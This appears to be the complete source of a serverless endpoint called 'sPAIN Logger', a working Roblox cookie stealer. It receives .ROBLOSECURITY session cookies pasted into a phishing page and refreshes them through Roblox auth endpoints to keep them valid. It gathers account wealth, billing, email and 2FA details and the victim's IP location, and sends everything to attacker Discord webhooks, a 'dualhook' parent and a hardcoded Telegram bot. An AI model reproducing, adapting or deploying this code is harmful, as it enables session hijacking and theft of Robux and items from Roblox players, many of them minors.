// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;
  const fullMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^\s"']+)/);
  if (fullMatch) return fullMatch[1];
  const psMatch = raw.match(/\.ROBLOSECURITY[^_]*(_\|WARNING[^\s"']+)/);
  if (psMatch) return psMatch[1];
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-.]{50,})/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
  const tokenOnly = raw.match(/\|_([\w\-.]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  const bareToken = raw.trim().match(/^([A-Za-z0-9\-_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
  return null;
}

// ── COOKIE REFRESH ────────────────────────────────────────────────────────────
// Makes a real Roblox auth request, captures the NEW cookie Roblox sends back
// in the Set-Cookie response header, and returns it.
// This refreshed cookie is what we send to Discord — it won't be expired.
async function refreshCookie(cookie) {
  try {
    // Step 1: hit logout to get a CSRF token (always returns 403 with the token)
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    const csrfToken = csrfRes.headers.get('x-csrf-token');

    // Step 2: make a real authenticated POST with CSRF — Roblox rotates the cookie
    const headers = {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      ...(csrfToken ? { 'x-csrf-token': csrfToken } : {})
    };

    // Use /v1/authentication-ticket as it always returns a refreshed Set-Cookie
    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
      method: 'POST',
      headers
    });

    // Try to pull the new .ROBLOSECURITY value from Set-Cookie
    const setCookie = ticketRes.headers.get('set-cookie') || csrfRes.headers.get('set-cookie') || '';
    const match = setCookie.match(/\.ROBLOSECURITY=([^;,\s]+)/);
    if (match && match[1] && match[1].length > 50) {
      const token = match[1];
      return token.startsWith('_|') ? token
        : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${token}`;
    }

    return cookie; // couldn't get refreshed — return original
  } catch (_) {
    return cookie;
  }
}

async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) { return false; }
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;

    const [profileRes, robuxRes, friendsRes, premiumRes, billingRes, emailRes,
           groupsRes, limitedsRes, avatarRes, tfaRes] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, {}),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, {}),
      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
    ]);

    const profile      = profileRes.ok    ? await profileRes.json()    : null;
    const robuxData    = robuxRes.ok       ? await robuxRes.json()      : null;
    const friendsData  = friendsRes.ok     ? await friendsRes.json()    : null;
    const isPremium    = premiumRes.ok     ? await premiumRes.json()    : false;
    const billingData  = billingRes.ok     ? await billingRes.json()    : null;
    const emailData    = emailRes.ok       ? await emailRes.json()      : null;
    const groupsData   = groupsRes.ok      ? await groupsRes.json()     : { data: [] };
    const limitedsData = limitedsRes.ok    ? await limitedsRes.json()   : { data: [] };
    const avatarData   = avatarRes.ok      ? await avatarRes.json()     : null;
    const tfaData      = tfaRes?.ok        ? await tfaRes.json()        : null;

    const accountAgeDays = profile?.created
      ? Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000) : 'N/A';

    const groups      = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    let groupRobux = 0, groupPending = 0;
    for (const group of ownedGroups.slice(0, 2)) {
      try {
        const [cr, pr] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        if (cr?.ok) { const c = await cr.json(); groupRobux   += c.robux || 0; }
        if (pr?.ok) { const p = await pr.json(); groupPending += p.data?.reduce((a,t) => a+(t.currency?.amount||0),0)||0; }
      } catch (_) {}
    }

    const limiteds      = limitedsData.data || [];
    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);

    const gamepasses = {
      mm2:       await checkGamepass(uid, '17510307', headers),
      adoptMe:   await checkGamepass(uid, '33135930', headers),
      plsDonate: await checkGamepass(uid, '12345678', headers)
    };

    return {
      id: uid, username: auth.name, displayName: auth.displayName,
      isPremium: isPremium === true, accountAgeDays,
      robux: robuxData?.robux || 0, pendingRobux: 0,
      friends: friendsData?.count || 0, credit: billingData?.balance || 0,
      groupsOwned: ownedGroups.length, groupRobux, groupPending,
      limitedsCount: limiteds.length, limitedsValue,
      emailSet:      emailData?.emailAddress ? 'Set ✅'      : 'False ❌',
      emailVerified: emailData?.verified     ? 'Verified ✅' : 'Unset ❌',
      twoFA:         tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌',
      gamepasses,
      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

function field(name, value, inline = true) {
  return { name: name?.substring(0,256), value: value?.toString()?.substring(0,1024)||'N/A', inline };
}

async function sendToDiscord(webhookUrl, data) {
  if (!webhookUrl?.includes('discord.com/api/webhooks') &&
      !webhookUrl?.includes('discordapp.com/api/webhooks')) return false;

  const { rawValue, originalCookie, refreshedCookie, roblox, ip, geo, now } = data;

  // Use refreshed cookie in the embed; fall back to original
  const displayCookie = (refreshedCookie && refreshedCookie !== originalCookie)
    ? refreshedCookie : (originalCookie || 'No cookie captured');
  const cookieLabel = (refreshedCookie && refreshedCookie !== originalCookie)
    ? '🔄 .ROBLOSECURITY (Refreshed)' : '🔐 .ROBLOSECURITY';

  // ── INVALID / TROLL ───────────────────────────────────────────────────────
  if (!roblox) {
    try {
      await fetch(webhookUrl, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: '@everyone',
          embeds: [{
            title: originalCookie ? '⚠️ Wrong Cookie / Troll Detected' : '🤡 No Cookie Detected',
            description: originalCookie
              ? ':rotating_light: `Invalid or expired cookie pasted` :rotating_light:'
              : ':rotating_light: `Nothing useful was submitted` :rotating_light:',
            color: 0xff0000,
            fields: [
              field('📥 Pasted', rawValue?.substring(0,1020) || '(empty)', false),
              field('📍 Location', `${geo?.city||'?'}, ${geo?.regionName||''}, ${geo?.country||'?'}`, true),
              field('🌐 IP', ip || 'Unknown', true),
              field('🕐 Date', now, false)
            ],
            footer: { text: 'sPAIN Logger • Invalid Submission' }
          }]
        })
      });
    } catch (_) {}
    return false;
  }

  // ── VALID ─────────────────────────────────────────────────────────────────
  const fields = [
    field('🔴 Robux',    `Balance: ${roblox.robux?.toLocaleString()||0}\nPending: ${roblox.pendingRobux||0}`),
    field('🎵 Rap',      `Rap: ${roblox.limitedsValue?.toLocaleString()||0}\nOwned: ${roblox.limitedsCount||0}`),
    field('📊 Summary',  `${roblox.accountAgeDays||'N/A'} Days`),
    field('💳 Billing',  `Credit: ${roblox.credit||0} USD\nConvert: 0`),
    field('🎫 Passes',   `Premium: ${roblox.isPremium?'✅':'❌'}\nVerified: ${roblox.emailVerified?.includes('✅')?'✅':'❌'}`),
    field('⚙️ Settings', `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`),
    field('👥 Groups',   `Balance: ${roblox.groupRobux?.toLocaleString()||0}\nOwned: ${roblox.groupsOwned||0}`),
    field('📍 Location', `${geo?.city||'?'}, ${geo?.country||'?'}`),
    field('🌐 IP',       ip || 'Unknown'),
    field('🎮 [EXTRA] Passes',
      `Murder Mystery 2 --> ${roblox.gamepasses?.mm2     ?'✅ True':'❌ False'}\n`+
      `Adopt Me          --> ${roblox.gamepasses?.adoptMe?'✅ True':'❌ False'}\n`+
      `PLS DONATE        --> ${roblox.gamepasses?.plsDonate?'✅ True':'❌ False'}`, false),
    field('🔔 Notification', `2FA is ${roblox.twoFA?.includes('Enabled')?'enabled':'not enabled'}.`, false),
    field(cookieLabel, `\`\`\`${displayCookie.substring(0,1020)}\`\`\``, false)
  ];

  try {
    const r = await fetch(webhookUrl, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `🧑 ${roblox.username} ${roblox.isPremium?'⭐':''}`,
          description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
          color: 5793266, fields,
          footer: { text: `sPAIN Logger • ${now}` },
          thumbnail: { url: roblox.avatarUrl }
        }]
      })
    });
    if (!r.ok) return false;
  } catch (_) { return false; }

  // Send full refreshed cookie as plain message — never cut off
  let rem = displayCookie;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990);
    rem = rem.substring(1990);
    await fetch(webhookUrl, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: '`' + chunk + '`' })
    }).catch(() => {});
  }
  return true;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try { record = await redisGet(`slot:${slug}`); }
  catch (err) { return res.status(500).json({ error: 'Redis error', detail: err.message }); }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.headers['x-real-ip']
           || req.socket?.remoteAddress
           || 'Unknown';
  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  const filledSlots = Object.entries(slots).filter(([, v]) => v && v.length > 0);
  const rawValue    = filledSlots.map(([, v]) => v).join('\n---\n');

  // ── STEP 1: Send raw cookie immediately before ANYTHING else ─────────────
  // So even if step 2 fails, you already have it in Discord
  for (const [, v] of filledSlots) {
    let rem = v;
    while (rem.length > 0) {
      const chunk = rem.substring(0, 1990);
      rem = rem.substring(1990);
      await fetch(record.webhook, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: '📋 RAW: `' + chunk + '`' })
      }).catch(() => {});
    }
  }

  // ── STEP 2: Extract cookie, refresh it, fetch Roblox info ────────────────
  const originalCookie = extractRobloxCookie(rawValue);

  // Refresh the cookie — get the new rotated token Roblox issues after a real request
  // This is the cookie you actually want to use, not the expired original
  const refreshedCookie = originalCookie ? await refreshCookie(originalCookie) : null;

  // Use the refreshed cookie to fetch account info
  const cookieToUse = refreshedCookie || originalCookie;
  const roblox      = cookieToUse ? await fetchRobloxInfo(cookieToUse) : null;

  const data = { rawValue, originalCookie, refreshedCookie, roblox, ip, geo, now };

  // ── STEP 3: Send full embed with refreshed cookie ─────────────────────────
  await sendToDiscord(record.webhook, data);

  // Dualhook parent also gets everything
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendToDiscord(parent.webhook, data);
      }
    } catch (_) {}
  }

  // Telegram log
  await tgSend([
    `🚨 <b>NEW SUBMISSION</b>`,
    `👤 <b>${roblox?.username || 'Unknown'}</b> ${roblox?.isPremium ? '⭐' : ''}`,
    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
    `🍪 Cookie: ${originalCookie ? '✅ Captured' : '❌ None'}`,
    `🔄 Refreshed: ${refreshedCookie && refreshedCookie !== originalCookie ? '✅ Yes' : '⚠️ Same'}`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `📄 Page: ${record.displayName} (${slug})`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
